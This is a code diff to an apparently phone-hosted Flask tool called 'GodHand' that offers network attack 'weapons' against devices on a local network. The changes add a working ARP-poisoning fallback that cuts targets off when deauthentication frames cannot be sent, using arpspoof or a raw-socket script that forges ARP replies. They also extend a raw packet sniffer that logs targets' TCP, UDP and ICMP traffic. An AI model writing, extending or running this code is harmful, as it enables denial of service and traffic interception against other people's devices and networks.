@@ -80,7 +80,6 @@ STATE = {
     'attack_pids': {},
     'attack_status': {},
     'blocked_macs': set(),
-    'monitor_log': [],
     'monitor_entries': [],
     'monitor_log_path': None,
     'bandwidth_sample': None,
@@ -160,7 +159,20 @@ def require_auth(f):
 
 app = Flask(__name__)
 
-# ---------- login (opt-in: only enforced when GODHAND_PASSWORD is set) ----------
+@app.after_request
+def add_no_cache_headers(response):
+    # This app's login gate lives entirely in the HTML/JS served by GET / --
+    # if a mobile browser (or a carrier/ISP transparent caching proxy, which is
+    # common on cellular data) ever caches that page, a phone can keep loading
+    # a stale pre-login copy indefinitely and never see the gate at all, no
+    # matter how correct the server-side logic is. Every response, not just /,
+    # is marked uncacheable so there is no path to a stale copy of any of it.
+    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+    response.headers['Pragma'] = 'no-cache'
+    response.headers['Expires'] = '0'
+    return response
+
+# ---------- login (mandatory: a password always exists, see AUTO_GENERATED_PASSWORD above) ----------
 @app.route('/api/login_required', methods=['GET'])
 def api_login_required():
     # True whenever require_auth would actually gate a request -- keeps this in
@@ -843,15 +855,29 @@ def set_monitor(iface, enable=True, raise_on_fail=False):
         return False
 
 def check_monitor_support(iface):
-    """Check if monitor mode is supported by the interface/driver."""
+    """Check if monitor mode is supported by the interface/driver.
+
+    Resolves the specific phy backing `iface` and inspects its advertised
+    "Supported interface modes" -- never actually switches modes, so a
+    routine capability check cannot itself drop the Wi-Fi connection. This
+    used to fall back to flipping the interface into monitor mode and back
+    just to test it, and to a blanket `iw phy` dump (every radio on the
+    system, not just this one) for the initial check -- both fixed here.
+    """
     try:
-        # Use iw phy to list capabilities
-        out = subprocess.check_output(['iw', 'phy'], text=True)
-        if 'monitor' in out.lower():
-            return True
-        # Fallback: attempt to set and revert quickly
-        return set_monitor(iface, True) and set_monitor(iface, False)
-    except:
+        dev_info = subprocess.check_output(
+            ['iw', 'dev', iface, 'info'], stderr=subprocess.DEVNULL, text=True, timeout=5)
+        m = re.search(r'^\s*wiphy (\d+)', dev_info, re.MULTILINE)
+        if not m:
+            return False
+        phy = f'phy{m.group(1)}'
+        phy_info = subprocess.check_output(
+            ['iw', 'phy', phy, 'info'], stderr=subprocess.DEVNULL, text=True, timeout=5)
+        modes_match = re.search(r'Supported interface modes:\s*\n((?:\s+\*.*\n?)+)', phy_info)
+        if not modes_match:
+            return False
+        return any(re.match(r'\s*\*\s*monitor\s*$', line) for line in modes_match.group(1).splitlines())
+    except Exception:
         return False
 
 # ---------- native (no-monitor-mode) deauth via AP station-del ----------
@@ -890,12 +916,26 @@ def native_deauth_station(iface, mac, reason_code=2):
         return False
 
 def deauth_capability(iface):
-    """What mechanism kick_client/start_attack_deauth will actually use for this interface, honestly."""
+    """What mechanism kick_client/start_attack_deauth will actually use for this interface, honestly.
+
+    There is no nl80211/iw primitive for a managed-mode (client) interface to
+    forge a frame at a third-party device while staying associated -- iw's own
+    command surface confirms it (mgmt dump frame is receive-only, mpath probe
+    is mesh-specific, vendor send is an opaque per-driver channel, and station
+    del only reaches entries in this interface's own station table, which in
+    client mode is just the AP itself). So there are exactly three honest
+    outcomes: this interface is itself an AP (native station-del works), the
+    driver genuinely advertises monitor mode (real frame injection works), or
+    neither -- in which case the ARP-poisoning fallback is the best available
+    substitute, not a real deauth.
+    """
     iface_type = get_iface_type(iface)
     if iface_type == 'AP':
         return {'method': 'native', 'iface_type': iface_type, 'ap_station_count': len(list_ap_stations(iface))}
     if check_monitor_support(iface):
         return {'method': 'monitor', 'iface_type': iface_type}
+    if get_state('gateway'):
+        return {'method': 'arp_fallback', 'iface_type': iface_type}
     return {'method': 'unavailable', 'iface_type': iface_type}
 
 # ---------- checksum helpers ----------
@@ -1019,13 +1059,20 @@ def start_attack_deauth_native(targets, iface):
     threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
     return [proc]
 
-def start_attack_deauth(targets, iface):
+def start_attack_deauth(targets, gateway, iface):
     add_log('info', f'Starting Deauth Flood on {iface} for {len(targets)} targets')
     if get_iface_type(iface) == 'AP':
         return start_attack_deauth_native(targets, iface)
     # First check if monitor mode is supported
     if not check_monitor_support(iface):
-        raise RuntimeError('Monitor mode is not supported on this interface. Deauth attack requires monitor mode and a compatible wireless adapter.')
+        # No monitor mode/injection means no real 802.11 deauth is possible from
+        # client mode -- true of essentially every stock Android Wi-Fi chipset.
+        # Fall back to the sustained ARP-poison technique (same as ARP Freeze):
+        # it achieves the same practical outcome, cutting the targets off the
+        # network, via a mechanism that works on any hardware, though it's a
+        # network-layer disconnect rather than a real 802.11 deauth.
+        add_log('warn', f'{iface} does not support monitor mode/frame injection (typical for a phone\'s built-in Wi-Fi) -- falling back to ARP-based disconnection instead of a true 802.11 deauth')
+        return start_attack_arp_freeze(targets, gateway, iface)
     if not set_monitor(iface, True, raise_on_fail=True):
         raise RuntimeError('Failed to enable monitor mode')
     pids = []
@@ -1244,10 +1291,12 @@ def compute_traffic_stats():
             b['bytes'] += e.get('len', 0)
         # The service port is conventionally the lower of the two -- using dp alone
         # would mislabel response packets (their dp is the remote's ephemeral port).
-        key = (e['proto'], min(e['sp'], e['dp']))
-        p = ports.setdefault(key, {'count': 0, 'bytes': 0})
-        p['count'] += 1
-        p['bytes'] += e.get('len', 0)
+        # ICMP has no ports at all, so it doesn't belong in a port breakdown.
+        if 'sp' in e and 'dp' in e:
+            key = (e['proto'], min(e['sp'], e['dp']))
+            p = ports.setdefault(key, {'count': 0, 'bytes': 0})
+            p['count'] += 1
+            p['bytes'] += e.get('len', 0)
     top_talkers = sorted(
         ({'host': h, 'count': v['count'], 'bytes': v['bytes']} for h, v in hosts.items()),
         key=lambda x: -x['bytes'])[:8]
@@ -1276,20 +1325,23 @@ def start_attack_monitor(targets, port, iface):
     if not set_monitor(iface, True, raise_on_fail=False):
         add_log('warn', 'Monitor mode could not be enabled; capture may be incomplete')
     with STATE_LOCK:
-        STATE['monitor_log'] = []
         STATE['monitor_entries'] = []
     # Use a writable temp directory
     tmpdir = tempfile.gettempdir()
     log_path = os.path.join(tmpdir, f"godhand_monitor_{int(time.time())}.log")
-    # Captures ALL TCP/UDP traffic to/from the targets (not just one port) --
-    # a single-port filter would defeat the point of a top-ports breakdown.
+    # Captures ALL TCP/UDP/ICMP traffic to/from the targets (not just one port) --
+    # a single-port filter would defeat the point of a top-ports breakdown. IPv4
+    # only, and assumes no IP options (20-byte header) -- covers the overwhelming
+    # majority of home-LAN traffic without the complexity of a full IHL/IPv6 parser.
     script = textwrap.dedent(f"""
         import socket, struct, select, time, sys, json
         IFACE = '{iface}'
         TARGETS = set({targets})
-        PROTO_NAMES = {{6: 'tcp', 17: 'udp'}}
+        PROTO_NAMES = {{6: 'tcp', 17: 'udp', 1: 'icmp'}}
+        ICMP_TYPES = {{0: 'echo-reply', 3: 'dest-unreachable', 8: 'echo-request', 11: 'time-exceeded'}}
         sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
         sock.bind((IFACE, 0))
+        pkt_no = 0
         while True:
             r, _, _ = select.select([sock], [], [], 0.5)
             if not r:
@@ -1306,9 +1358,27 @@ def start_attack_monitor(targets, port, iface):
             proto = PROTO_NAMES.get(data[23])
             if proto is None:
                 continue
-            sp, dp = struct.unpack('!HH', data[34:38])
             length = struct.unpack('!H', data[16:18])[0]
-            print(json.dumps({{'t': time.time(), 'src': src_ip, 'dst': dst_ip, 'sp': sp, 'dp': dp, 'proto': proto, 'len': length}}))
+            pkt_no += 1
+            entry = {{'no': pkt_no, 't': time.time(), 'src': src_ip, 'dst': dst_ip, 'proto': proto, 'len': length}}
+            if proto in ('tcp', 'udp'):
+                sp, dp = struct.unpack('!HH', data[34:38])
+                entry['sp'] = sp
+                entry['dp'] = dp
+                if proto == 'tcp' and len(data) >= 48:
+                    flag_byte = data[47]
+                    flags = []
+                    if flag_byte & 0x02: flags.append('SYN')
+                    if flag_byte & 0x10: flags.append('ACK')
+                    if flag_byte & 0x01: flags.append('FIN')
+                    if flag_byte & 0x04: flags.append('RST')
+                    if flag_byte & 0x08: flags.append('PSH')
+                    if flag_byte & 0x20: flags.append('URG')
+                    entry['flags'] = flags
+            elif proto == 'icmp':
+                icmp_type = data[34]
+                entry['icmp_type'] = ICMP_TYPES.get(icmp_type, f'type-{{icmp_type}}')
+            print(json.dumps(entry))
             sys.stdout.flush()
     """)
     fd, path = tempfile.mkstemp(suffix='.py')
@@ -1335,20 +1405,16 @@ def start_attack_monitor(targets, port, iface):
                     last_pos = lf.tell()
                     if new_lines:
                         entries = []
-                        texts = []
                         for line in new_lines:
                             try:
                                 e = json.loads(line)
                             except ValueError:
                                 continue
+                            e['dir'] = 'out' if e['src'] in targets else 'in'
                             entries.append(e)
-                            arrow = '->' if e['src'] in targets else '<-'
-                            other_port = e['dp'] if arrow == '->' else e['sp']
-                            texts.append(f"{e['src']} {arrow} {e['dst']}:{other_port} ({e['proto']}, {e['len']}B)\n")
                         if entries:
                             with STATE_LOCK:
                                 STATE['monitor_entries'] = (STATE['monitor_entries'] + entries)[-500:]
-                                STATE['monitor_log'] = (STATE['monitor_log'] + texts)[-100:]
             except:
                 pass
             time.sleep(0.5)
@@ -1361,7 +1427,7 @@ def run_attack(weapon_id, targets, gateway, port, iface):
     if weapon_id == 1:
         return start_attack_arp_freeze(targets, gateway, iface)
     elif weapon_id == 2:
-        return start_attack_deauth(targets, iface)
+        return start_attack_deauth(targets, gateway, iface)
     elif weapon_id == 3:
         return start_attack_syn_flood(targets, port, iface)
     elif weapon_id == 4:
@@ -1434,6 +1500,66 @@ def kill_attack(pids):
                 pass
 
 # ---------- kick & block with verification ----------
+def arp_kick_burst(ip, gateway, iface, duration=6):
+    """Bounded ARP-poison burst: the fallback kick for the common case on stock
+    Android Wi-Fi hardware -- client mode, no monitor mode/injection support at
+    all in the driver. This is a network-layer disconnect (the target stays
+    associated to the AP at the 802.11 level but can't reach anything through
+    it), not a real deauth, and it is less durable than one: nothing stops the
+    target from working again the instant the burst ends, whereas a real
+    deauth forces an actual re-association. It is, however, the one technique
+    that works from ordinary client mode with no special hardware or root
+    beyond what raw sockets already need -- the same mechanism ARP Freeze uses.
+    """
+    if not gateway:
+        raise RuntimeError('Gateway not set -- required for the ARP-based kick fallback.')
+    if ensure_tool('arpspoof', 'dsniff'):
+        procs = [
+            subprocess.Popen(['arpspoof', '-i', iface, '-t', ip, gateway], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
+            subprocess.Popen(['arpspoof', '-i', iface, '-t', gateway, ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
+        ]
+        time.sleep(duration)
+        for p in procs:
+            p.terminate()
+        for p in procs:
+            try:
+                p.wait(timeout=2)
+            except Exception:
+                p.kill()
+        return
+    fake_mac = '02:00:00:00:00:01'
+    script = textwrap.dedent(f"""
+        import socket, struct, time
+        IFACE = '{iface}'
+        GATEWAY = '{gateway}'
+        TARGET = '{ip}'
+        FAKE = bytes.fromhex('{fake_mac.replace(':', '')}')
+        def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
+            eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
+            arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
+            arp += src_mac + socket.inet_aton(src_ip)
+            arp += dst_mac + socket.inet_aton(dst_ip)
+            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+            s.bind((IFACE, 0))
+            s.send(eth + arp)
+            s.close()
+        end = time.time() + {duration}
+        while time.time() < end:
+            send_arp(2, GATEWAY, TARGET, FAKE, b'\\xff'*6)
+            send_arp(2, TARGET, GATEWAY, FAKE, b'\\xff'*6)
+            time.sleep(0.3)
+    """)
+    fd, path = tempfile.mkstemp(suffix='.py')
+    os.close(fd)
+    with open(path, 'w') as f:
+        f.write(script)
+    try:
+        res = subprocess.run(['python3', path], stderr=subprocess.PIPE, timeout=duration + 5)
+        if res.returncode != 0:
+            raise RuntimeError('ARP-based kick fallback failed: ' + res.stderr.decode(errors='ignore')[-300:])
+    finally:
+        os.unlink(path)
+
 def kick_client(ip, mac, iface):
     add_log('info', f'Attempting to kick {ip} ({mac})')
     iface_type = get_iface_type(iface)
@@ -1457,7 +1583,21 @@ def kick_client(ip, mac, iface):
         return True
 
     if not check_monitor_support(iface):
-        raise RuntimeError('Monitor mode is not supported on this interface.')
+        # Stock Android Wi-Fi chipsets essentially never expose monitor mode/frame
+        # injection to mac80211 -- there is no software trick that makes a real
+        # 802.11 deauth possible here. Fall back to the one technique that does
+        # work from ordinary client mode: a bounded ARP-poison burst that cuts
+        # the target's network access for a few seconds, same mechanism ARP
+        # Freeze uses. Clearly labeled as a fallback, not silently substituted.
+        add_log('warn', f'{iface} does not support monitor mode/frame injection (typical for a phone\'s built-in Wi-Fi) -- falling back to a brief ARP-based disconnect for {mac}, not a true 802.11 deauth')
+        arp_kick_burst(ip, STATE['gateway'], iface)
+        time.sleep(1)
+        reachable = server_ping(ip, timeout=1)
+        if reachable:
+            add_log('warn', f'Target {ip} is still responding to ping after the ARP-based kick')
+            return False
+        add_log('success', f'Target {ip} is not responding to ping after the ARP-based kick')
+        return True
     if not set_monitor(iface, True, raise_on_fail=True):
         raise RuntimeError('Cannot enable monitor mode')
     if ensure_tool('aireplay-ng', 'aircrack-ng'):
@@ -1547,6 +1687,9 @@ def index():
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
 <title>GodHand: Network Command</title>
 <style>
 :root {
@@ -2295,6 +2438,9 @@ nav button .icon svg { display: block; }
 
 <main>
   <div id="tab-settings" class="tab-content active">
+    <div id="root-warning" class="status-message" style="display:none; border-left-color:var(--danger);">
+      <strong>Not running as root.</strong> Recon scanning, ARP Freeze, Deauth Flood, SYN Flood, DHCP Storm, and Traffic Capture all need raw sockets (and <code>iw</code>/<code>iptables</code> for some), which require root. Run this with <code>sudo</code> (or as root in Termux) or these will fail.
+    </div>
     <div class="card">
       <h2>Interface & gateway</h2>
       <p class="sub">Start here — set your Wi‑Fi interface and gateway IP before scanning or attacking.</p>
@@ -2560,8 +2706,14 @@ GODHAND_DDNS_ENABLED=1                  # optional, default on when the above ar
       <div class="empty" id="traffic-ports-empty">No traffic captured yet.</div>
     </div>
     <div class="card">
-      <h2>Raw connection feed</h2>
-      <div class="log-container" id="traffic-container" style="display:none;"></div>
+      <h2>Live packet feed</h2>
+      <p class="sub">Every IPv4 TCP/UDP/ICMP packet to or from your targets, newest at the bottom -- like a live Wireshark capture scoped to this device.</p>
+      <div class="table-responsive" style="max-height:380px; overflow-y:auto;">
+        <table id="traffic-packets-table" style="display:none; font-family:'JetBrains Mono',monospace; font-size:0.78rem;">
+          <thead><tr><th>No.</th><th>Time</th><th>Dir</th><th>Source</th><th>Destination</th><th>Proto</th><th>Length</th><th>Info</th></tr></thead>
+          <tbody id="traffic-packets-body"></tbody>
+        </table>
+      </div>
       <div class="empty" id="traffic-empty">Not capturing. Select weapon 5 on the Attacks tab and press Start.</div>
     </div>
     <div class="card">
@@ -2776,18 +2928,54 @@ function clearServerLogs() {
 }
 
 // Live traffic capture
+function formatPacketInfo(e) {
+  if (e.proto === 'tcp') {
+    const flags = e.flags && e.flags.length ? ` [${e.flags.join(', ')}]` : '';
+    return `${e.sp} → ${e.dp}${flags} Len=${e.len}`;
+  }
+  if (e.proto === 'udp') {
+    return `${e.sp} → ${e.dp} Len=${e.len}`;
+  }
+  if (e.proto === 'icmp') {
+    return `${e.icmp_type || 'icmp'} Len=${e.len}`;
+  }
+  return `Len=${e.len}`;
+}
+function formatPacketRow(e) {
+  const time = new Date(e.t * 1000);
+  const hh = String(time.getHours()).padStart(2, '0');
+  const mm = String(time.getMinutes()).padStart(2, '0');
+  const ss = String(time.getSeconds()).padStart(2, '0');
+  const ms = String(time.getMilliseconds()).padStart(3, '0');
+  const badgeClass = e.proto === 'tcp' ? 'info' : e.proto === 'udp' ? 'success' : 'warning';
+  const dirArrow = e.dir === 'out' ? '↑' : '↓';
+  return `
+    <tr>
+      <td data-label="No.">${e.no}</td>
+      <td data-label="Time">${hh}:${mm}:${ss}.${ms}</td>
+      <td data-label="Dir">${dirArrow}</td>
+      <td data-label="Source">${escapeHtml(e.src)}</td>
+      <td data-label="Destination">${escapeHtml(e.dst)}</td>
+      <td data-label="Proto"><span class="badge ${badgeClass}">${e.proto.toUpperCase()}</span></td>
+      <td data-label="Length">${e.len}</td>
+      <td data-label="Info">${escapeHtml(formatPacketInfo(e))}</td>
+    </tr>
+  `;
+}
 async function pollTrafficCapture() {
   try {
     const res = await apiCall('monitor_log');
-    const container = document.getElementById('traffic-container');
+    const table = document.getElementById('traffic-packets-table');
+    const body = document.getElementById('traffic-packets-body');
     const empty = document.getElementById('traffic-empty');
-    if (res.lines && res.lines.length) {
+    if (res.entries && res.entries.length) {
       empty.style.display = 'none';
-      container.style.display = 'block';
-      container.innerHTML = res.lines.map(l => `<div class="log-entry"><span class="msg">${l}</span></div>`).join('');
-      container.scrollTop = container.scrollHeight;
+      table.style.display = 'table';
+      body.innerHTML = res.entries.map(formatPacketRow).join('');
+      const wrap = table.closest('.table-responsive');
+      if (wrap) wrap.scrollTop = wrap.scrollHeight;
     } else {
-      container.style.display = 'none';
+      table.style.display = 'none';
       empty.style.display = 'block';
       empty.textContent = res.capturing
         ? 'Capturing... waiting for matching traffic.'
@@ -2795,8 +2983,9 @@ async function pollTrafficCapture() {
     }
     const attacksStatus = document.getElementById('attacks-traffic-status');
     if (attacksStatus) {
+      const n = res.entries ? res.entries.length : 0;
       attacksStatus.textContent = res.capturing
-        ? `Capturing — ${res.lines.length} recent connection(s) logged. See the Monitor tab for the full analysis panel.`
+        ? `Capturing — ${n} recent packet(s) logged. See the Monitor tab for the full analysis panel.`
         : 'Not capturing.';
     }
   } catch(e) {}
@@ -3119,6 +3308,10 @@ async function checkPrerequisites() {
     const s = state.state;
     document.getElementById('settings-status').textContent =
       `Current: IFACE: ${s.interface || 'none'}, GW: ${s.gateway || 'none'}, PORT: ${s.port}`;
+    const rootWarning = document.getElementById('root-warning');
+    if (rootWarning) {
+      rootWarning.style.display = state.is_root ? 'none' : 'block';
+    }
   } catch(e) {}
 }
 
@@ -3171,8 +3364,10 @@ async function refreshDeauthCapability() {
       box.innerHTML = `<span class="badge success">Native</span> ${res.iface_type} interface is your own access point — Kick / Deauth Flood use the kernel's station-del, no monitor mode. ${res.ap_station_count} station(s) currently associated.`;
     } else if (res.method === 'monitor') {
       box.innerHTML = `<span class="badge warning">Monitor mode</span> Interface is ${res.iface_type} — Kick / Deauth Flood will switch it to monitor mode and use frame injection.`;
+    } else if (res.method === 'arp_fallback') {
+      box.innerHTML = `<span class="badge warning">ARP fallback</span> ${res.iface_type} interface has no monitor mode/injection support (typical for a phone's built-in Wi-Fi, and there's no netlink shortcut around it — a client interface can only forge frames at itself, not a third party) — Kick / Deauth Flood will fall back to ARP-based disconnection instead. This cuts network access rather than sending a true 802.11 deauth frame, and is less durable.`;
     } else {
-      box.innerHTML = `<span class="badge danger">Unavailable</span> Interface is ${res.iface_type} and doesn't support monitor mode — Kick / Deauth Flood can't function on this hardware.`;
+      box.innerHTML = `<span class="badge danger">Unavailable</span> Interface is ${res.iface_type}, doesn't support monitor mode, and no gateway is set for the ARP-based fallback — Kick / Deauth Flood can't function yet. Set a gateway on the Settings tab.`;
     }
   } catch(e) {}
 }
@@ -3671,7 +3866,7 @@ function initApp() {
   loadDdnsConfig();
   setInterval(pollLogs, 2000);
   setInterval(pollAttackStatus, 2000);
-  setInterval(pollTrafficCapture, 1500);
+  setInterval(pollTrafficCapture, 1000);
   setInterval(pollBandwidth, 2000);
   setInterval(refreshGatewayStatus, 4000);
 }
@@ -3767,6 +3962,7 @@ def api_state():
             },
             'running_attacks': list(STATE['attack_pids'].keys()),
             'auth_enabled': bool(SECRET or LOGIN_PASSWORD),
+            'is_root': os.geteuid() == 0,
         })
 
 @app.route('/api/scan', methods=['GET'])
@@ -3882,8 +4078,8 @@ def api_attack_status():
 @app.route('/api/monitor_log', methods=['GET'])
 @require_auth
 def api_monitor_log():
-    lines = STATE.get('monitor_log', [])
-    return jsonify({'lines': lines[-100:], 'capturing': 5 in STATE['attack_pids']})
+    entries = STATE.get('monitor_entries', [])
+    return jsonify({'entries': entries[-150:], 'capturing': 5 in STATE['attack_pids']})
 
 @app.route('/api/traffic_stats', methods=['GET'])
 @require_auth
